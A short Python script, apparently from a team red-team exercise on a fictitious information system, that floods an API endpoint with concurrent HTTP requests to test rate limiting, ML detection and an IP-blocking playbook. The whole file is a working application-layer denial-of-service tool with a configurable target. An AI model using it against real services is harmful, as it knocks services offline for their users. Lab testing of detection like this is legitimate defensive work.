#!/usr/bin/env python3
"""Scénario Red Team — déni de service applicatif contrôlé (flood HTTP).

Génère un volume de requêtes qui sature l'API métier : hausse du taux de
requêtes, de la latence p95 et des 429 (rate limit WAF). Effet OBSERVABLE
par la surveillance -> détection ML -> playbook `dos_flood` (blocage IP).

Périmètre strict : uniquement le SI fictif de l'équipe (sujet §3.4 / §9).

Usage :
    python3 flood.py --target http://192.168.137.1:8080 --duration 40 --workers 50
"""

from __future__ import annotations

import argparse
import threading
import time
import urllib.request
from collections import Counter

_stats = Counter()
_lock = threading.Lock()


def _worker(target: str, stop: threading.Event) -> None:
    url = f"{target}/api/health"
    local = Counter()
    while not stop.is_set():
        try:
            with urllib.request.urlopen(url, timeout=3) as resp:
                local[str(resp.status)] += 1
        except urllib.error.HTTPError as exc:
            local[str(exc.code)] += 1
        except Exception:
            local["error"] += 1
    with _lock:
        _stats.update(local)


def main() -> None:
    p = argparse.ArgumentParser(description="Flood HTTP contrôlé")
    p.add_argument("--target", required=True, help="URL du WAF, ex. http://192.168.137.1:8080")
    p.add_argument("--duration", type=int, default=40, help="durée en secondes")
    p.add_argument("--workers", type=int, default=50, help="threads concurrents")
    args = p.parse_args()

    print(f"[flood] cible={args.target} durée={args.duration}s workers={args.workers}")
    stop = threading.Event()
    threads = [
        threading.Thread(target=_worker, args=(args.target, stop)) for _ in range(args.workers)
    ]
    for t in threads:
        t.start()

    time.sleep(args.duration)
    stop.set()
    for t in threads:
        t.join()

    total = sum(_stats.values())
    print(f"[flood] terminé — {total} requêtes envoyées")
    for code, n in sorted(_stats.items()):
        print(f"        {code}: {n}")


if __name__ == "__main__":
    main()
